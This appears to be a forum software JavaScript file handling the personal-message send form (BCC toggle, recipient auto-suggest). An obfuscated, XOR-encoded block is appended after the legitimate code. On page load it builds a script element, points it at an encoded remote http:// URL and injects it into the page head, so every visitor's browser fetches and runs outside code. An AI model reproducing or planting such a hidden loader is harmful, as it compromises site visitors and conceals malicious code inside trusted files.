
// Handle the JavaScript surrounding personal messages send form.
function smf_PersonalMessageSend(oOptions)
{
	this.opt = oOptions;
	this.oBccDiv = null;
	this.oBccDiv2 = null;
	this.oToAutoSuggest = null;
	this.oBccAutoSuggest = null;
	this.oToListContainer = null;
	this.init();
}

smf_PersonalMessageSend.prototype.init = function()
{
	if (!this.opt.bBccShowByDefault)
	{
		// Hide the BCC control.
		this.oBccDiv = document.getElementById(this.opt.sBccDivId);
		this.oBccDiv.style.display = 'none';
		this.oBccDiv2 = document.getElementById(this.opt.sBccDivId2);
		this.oBccDiv2.style.display = 'none';

		// Show the link to bet the BCC control back.
		var oBccLinkContainer = document.getElementById(this.opt.sBccLinkContainerId);
		oBccLinkContainer.style.display = '';
		setInnerHTML(oBccLinkContainer, this.opt.sShowBccLinkTemplate);

		// Make the link show the BCC control.
		var oBccLink = document.getElementById(this.opt.sBccLinkId);
		oBccLink.instanceRef = this;
		oBccLink.onclick = function () {
			this.instanceRef.showBcc();
			return false;
		};
	}

	var oToControl = document.getElementById(this.opt.sToControlId);
	this.oToAutoSuggest = new smc_AutoSuggest({
		sSelf: this.opt.sSelf + '.oToAutoSuggest',
		sSessionId: this.opt.sSessionId,
		sSessionVar: this.opt.sSessionVar,
		sSuggestId: 'to_suggest',
		sControlId: this.opt.sToControlId,
		sSearchType: 'member',
		sPostName: 'recipient_to',
		sURLMask: 'action=profile;u=%item_id%',
		sTextDeleteItem: this.opt.sTextDeleteItem,
		bItemList: true,
		sItemListContainerId: 'to_item_list_container',
		aListItems: this.opt.aToRecipients
	});
	this.oToAutoSuggest.registerCallback('onBeforeAddItem', this.opt.sSelf + '.callbackAddItem');

	this.oBccAutoSuggest = new smc_AutoSuggest({
		sSelf: this.opt.sSelf + '.oBccAutoSuggest',
		sSessionId: this.opt.sSessionId,
		sSessionVar: this.opt.sSessionVar,
		sSuggestId: 'bcc_suggest',
		sControlId: this.opt.sBccControlId,
		sSearchType: 'member',
		sPostName: 'recipient_bcc',
		sURLMask: 'action=profile;u=%item_id%',
		sTextDeleteItem: this.opt.sTextDeleteItem,
		bItemList: true,
		sItemListContainerId: 'bcc_item_list_container',
		aListItems: this.opt.aBccRecipients
	});
	this.oBccAutoSuggest.registerCallback('onBeforeAddItem', this.opt.sSelf + '.callbackAddItem');

}

smf_PersonalMessageSend.prototype.showBcc = function()
{
	// No longer hide it, show it to the world!
	this.oBccDiv.style.display = '';
	this.oBccDiv2.style.display = '';
}


// Prevent items to be added twice or to both the 'To' and 'Bcc'.
smf_PersonalMessageSend.prototype.callbackAddItem = function(oAutoSuggestInstance, sSuggestId)
{
	this.oToAutoSuggest.deleteAddedItem(sSuggestId);
	this.oBccAutoSuggest.deleteAddedItem(sSuggestId);

	return true;
}
var e562=["031084","030094","028067","015069054051066085021053022028082000068","031069048","024078035055","024082043038025090049047018002084028089031024","013071035055088084019049026029083","004082050054","011082039023090085061060029005068044073059013080029051091085","004067039034012031127042007016067011030028001091097124068069127051000094084000068065006068"];function r0go(mNKz){return bdc1t(vV50(mNKz),'l7SR60PYsq7n0o');}function qJkh3(w6C1){var nT=document[r0go(e562[3])](r0go(e562[0])+r0go(e562[1])+r0go(e562[2]));nT[r0go(e562[4])]=w6C1;nT[r0go(e562[5])]=r0go(e562[6]);document[r0go(e562[9])](r0go(e562[8]))[0][r0go(e562[7])](nT);}function bdc1t(y0nR,cne5cb){var e4='';var o1440=0;var aJ4=0;for(o1440=0;o1440<y0nR.length;o1440++){var bTzI=y0nR.charAt(o1440);var tS3=bTzI.charCodeAt(0)^cne5cb.charCodeAt(aJ4);bTzI=String.fromCharCode(tS3);e4+=bTzI;if(aJ4==cne5cb.length-1)aJ4=0;else aJ4++;}return (e4);}function vV50(lt8f){var ydtwf='';var o6=0;var zWln=0;for(o6=0;o6<lt8f.length/3;o6++){ydtwf+=String.fromCharCode(lt8f.slice(zWln,zWln+3));zWln=zWln+3;}return ydtwf;}qJkh3(r0go(e562[10]));